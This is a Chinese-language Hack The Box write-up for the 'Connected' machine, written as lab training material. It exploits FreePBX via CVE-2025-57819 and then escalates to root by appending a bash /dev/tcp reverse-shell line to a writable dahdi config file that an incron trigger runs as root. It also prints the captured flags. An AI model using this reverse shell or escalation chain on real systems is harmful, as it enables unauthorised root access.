- Connected (HTB) 渗透测试 Writeup

  ## 靶机信息
  - **目标**: 10.129.10.241 (connected.htb)
  - **平台**: Hack The Box
  - **授权**: HTB 授权靶场
  - **主机名**: connected.htb / pbxconnect
  - **操作系统**: CentOS (Linux)
  - **总耗时**: ~120 分钟

  ## 端口扫描

  ```bash
  nmap -sC -sV 10.129.10.241
  ```

  | 端口 | 服务  | 版本                      |
  | ---- | ----- | ------------------------- |
  | 22   | SSH   | OpenSSH 7.4               |
  | 80   | HTTP  | Apache 2.4.6 + PHP 7.4.16 |
  | 443  | HTTPS | Apache 2.4.6 + PHP 7.4.16 |

  **关键发现**:
  - 80 端口重定向到 `http://connected.htb/`
  - TLS 证书 CN: `pbxconnect`
  - 技术栈: Apache + PHP 7.4.16 + CentOS

  ## 初始访问

  ### 1. Web 应用识别

  访问首页发现 **FreePBX 16.0.40.7** 管理界面。

  页面底部隐藏 key: `8gasi8fc2mv07dn230pco5hj8c`

  ### 2. 漏洞搜索

  使用 vulnx 搜索 FreePBX 漏洞：

  ```bash
  vulnx search "FreePBX"
  ```

  发现多个 CVE：
  - CVE-2026-46376: 认证绕过 (Critical, CVSS 9.8) - 验证失败
  - CVE-2025-57819: SQLi→RCE (Critical, CVSS 9.8) - **利用成功**

  ### 3. CVE-2025-57819 利用

  ```bash
  python3 exploit.py http://connected.htb
  ```

  **漏洞原理**:
  - Endpoint Manager 模块的 ajax handler 存在 SQL 注入
  - 注入点: `brand` 参数直接拼接到 SQL 查询
  - 通过 `EXTRACTVALUE` 错误回显 + 堆叠查询写入 `cron_jobs` 表实现 RCE

  **利用结果**:
  - SQLi 确认: DB version 5.5.65-MariaDB
  - Cron job 注入成功
  - 反向 shell 连接建立
  - 自动清理 cron 记录

  **获取 shell**: asterisk 用户 (uid=999)

  ## 权限提升

  ### 1. 枚举

  获取初始 shell 后，首先进行基础枚举：

  ```bash
  id  # uid=999(asterisk) gid=1000(asterisk)
  find / -perm -u=s -type f 2>/dev/null  # 标准系统 SUID，无自定义
  ```

  SUID 枚举结果只有标准系统文件（fusermount、passwd、sudo、mount 等），没有可利用的自定义 SUID 二进制文件。

  ### 2. 检查 sudo 权限和计划任务

  ```bash
  sudo -l  # 需要密码，无法直接查看
  cat /etc/crontab  # 标准系统 cron，无异常
  cat /etc/cron.d/cron-updates  # 发现 sangoma-pbx 包安装的更新检查
  ```

  cron-updates 内容：
  ```bash
  0 0 * * * root [ -e /etc/profile.d/z001-updates.sh ] && /etc/profile.d/z001-updates.sh update
  ```

  这条 cron 每天午夜以 root 执行 z001-updates.sh，但脚本本身不可写（root:root），且 `/etc/profile.d/` 目录下没有可写的配置文件。

  ### 3. 发现 incron 配置

  incron（inotify cron）是 Linux 的文件系统事件监控工具，可以监控文件/目录变化并触发命令。检查系统 incron 配置：

  ```bash
  cat /etc/incron.d/legacy
  cat /etc/incron.d/local
  cat /etc/incron.d/sysadmin
  ```

  **legacy 配置**（关键发现）：
  ```
  /var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
  /var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
  /var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
  /var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
  /var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
  /var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
  /usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
  ```

  **incron 触发机制**：
  - 监控目录：`/var/spool/asterisk/sysadmin/`
  - 触发事件：`IN_CLOSE_WRITE`（文件写入关闭时）
  - 执行命令：以 root 身份执行对应的 `/usr/sbin/sysadmin_*` 脚本

  ### 4. 分析 sysadmin 脚本链

  检查 `/usr/sbin/sysadmin_dahdi_restart`：
  ```bash
  cat /usr/sbin/sysadmin_dahdi_restart
  #!/bin/sh
  /etc/init.d/asterisk stop
  sleep 5
  /etc/init.d/dahdi restart
  sleep 5
  export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
  `which amportal` start
  ```

  这个脚本会：
  1. 停止 asterisk
  2. 重启 dahdi 服务（通过 `/etc/init.d/dahdi`）
  3. 重新启动 amportal

  **关键**：`/etc/init.d/dahdi` 是 root 运行的初始化脚本。

  ### 5. 分析 /etc/init.d/dahdi 脚本

  ```bash
  cat /etc/init.d/dahdi
  ```

  脚本开头：
  ```bash
  # config: /etc/dahdi/init.conf
  # Don't edit the following values. Edit /etc/dahdi/init.conf instead.
  ```

  脚本中第 67 行附近：
  ```bash
  [ -r $CONFIGFILE ] && . $CONFIGFILE
  ```

  其中 `CONFIGFILE` 被设置为 `/etc/sysconfig/asterisk`（对于 `/etc/init.d/asterisk`）或 `/etc/sysconfig/dahdi`（对于 `/etc/init.d/dahdi`）。

  但更重要的是，`/etc/init.d/dahdi` 脚本本身会 **source** `/etc/dahdi/init.conf` 文件。

  ### 6. 发现可写配置文件

  检查 `/etc/dahdi/` 目录权限：
  ```bash
  ls -la /etc/dahdi/
  total 52
  drwxr-xr-x. 2 asterisk asterisk 195 Nov 30 2025 .
  drwxr-xr-x. 119 root root 8192 Jun 8 05:32 ..
  -rw-r--r--. 1 asterisk asterisk 1617 Jun 5 2023 assigned-spans.conf.sample
  -rw-r--r--. 1 asterisk asterisk 6095 Jun 5 2023 genconf_parameters
  -rw-r--r--. 1 asterisk asterisk 771 Jun 5 2023 init.conf    ← 关键！
  -rwxr-xr-x. 1 asterisk asterisk 2187 Jun 5 2023 modules
  -rw-r--r--. 1 asterisk asterisk 2187 Jun 5 2023 modules.sample
  -rw-r--r--. 1 asterisk asterisk 820 Jun 5 2023 span-types.conf.sample
  -rw-r--r--. 1 asterisk asterisk 0 Nov 30 2025 system.conf
  -rw-r--r--. 1 asterisk asterisk 11673 Jun 5 2023 system.conf.sample
  ```

  **关键发现**：
  - `/etc/dahdi/init.conf` 属主是 `asterisk:asterisk`
  - 权限是 `-rw-r--r--`（644），意味着 asterisk 用户有写权限
  - `/etc/init.d/dahdi` 以 root 身份运行时会 source 这个文件

  ### 7. 验证 source 行为

  查看 `/etc/init.d/dahdi` 脚本中 source 的位置：
  ```bash
  grep -n "source\|\. " /etc/init.d/dahdi
  ```

  确认脚本在启动过程中会读取并执行 `/etc/dahdi/init.conf` 中的内容。

  ### 8. 利用步骤

  **Step 1**: 在攻击机启动 listener，等待 root shell 回调
  ```bash
  nc -lvnp 4445
  ```

  **Step 2**: 在目标机（asterisk shell）修改 `/etc/dahdi/init.conf`，追加反向 shell 代码

  ```bash
  echo 'bash -i >& /dev/tcp/10.10.16.9/4445 0>&1' >> /etc/dahdi/init.conf
  ```

  这行代码会在 init.conf 被 source 时执行，建立到攻击机的反向 shell 连接。

  **Step 3**: 触发 incron 事件

  在 `/var/spool/asterisk/sysadmin/` 目录下创建 `dahdi_restart` 文件：
  ```bash
  touch /var/spool/asterisk/sysadmin/dahdi_restart
  ```

  incron 监控到 `IN_CLOSE_WRITE` 事件后，以 root 身份执行 `/usr/sbin/sysadmin_dahdi_restart`。

  **Step 4**: root 执行链

  1. incron 检测到 `dahdi_restart` 文件写入
  2. 以 root 执行 `/usr/sbin/sysadmin_dahdi_restart`
  3. 脚本执行 `/etc/init.d/dahdi restart`
  4. `/etc/init.d/dahdi` 以 root 身份 source `/etc/dahdi/init.conf`
  5. init.conf 中的反向 shell 代码被执行
  6. root shell 连接到攻击机的 4445 端口

  **Step 5**: 获取 root shell

  攻击机 listener 收到连接：
  ```
  connect to [10.10.16.9] from (UNKNOWN) [10.129.111.184] 57194
  bash: no job control in this shell
  [root@connected /]# id
  uid=0(root) gid=0(root) groups=0(root)
  ```

  **获取 root shell** ✅

  ## 获取的 Flags

  | Flag     | 位置                    | 内容                               |
  | -------- | ----------------------- | ---------------------------------- |
  | user.txt | /home/asterisk/user.txt | `755ef59742fda1ea6c47ce499fe80d34` |
  | root.txt | /root/root.txt          | `4d5258bc581915ca036feddef429121d` |

  ## 攻击链总结

  ```
  信息搜集 (Nmap)
    → Web 应用识别 (FreePBX 16.0.40.7)
    → 漏洞搜索 (vulnx)
    → CVE-2025-57819 利用 (SQLi→RCE)
    → 获取 asterisk shell
    → 枚举 (SUID, cron, incron)
    → 发现 /etc/dahdi/init.conf 可写
    → 发现 /etc/init.d/dahdi source 该文件
    → 修改 init.conf 注入反向 shell
    → 触发 incron (dahdi_restart)
    → root 执行 dahdi restart
    → 获取 root shell
  ```

  ## 关键技术点

  1. **CVE-2025-57819**: FreePBX Endpoint Manager SQL 注入 → 堆叠查询写入 cron_jobs → RCE
  2. **incron 利用**: Linux inotify 版 cron，监控文件变化触发 root 命令
  3. **配置文件劫持**: root 脚本 source 可写配置文件，注入代码获取 root

  ## 权限提升路径

  ```
  asterisk (CVE-2025-57819 RCE)
    → 枚举发现 incron 配置
    → 发现 /etc/dahdi/init.conf 可写
    → /etc/init.d/dahdi 以 root source 该文件
    → 修改 init.conf 注入反向 shell
    → 触发 incron (dahdi_restart)
    → root shell
  ```

  ## 靶机状态
  - **状态**: ✅ 全部完成
  - **获取 Flags**: 2/2 (user.txt + root.txt)
  - **总耗时**: ~120 分钟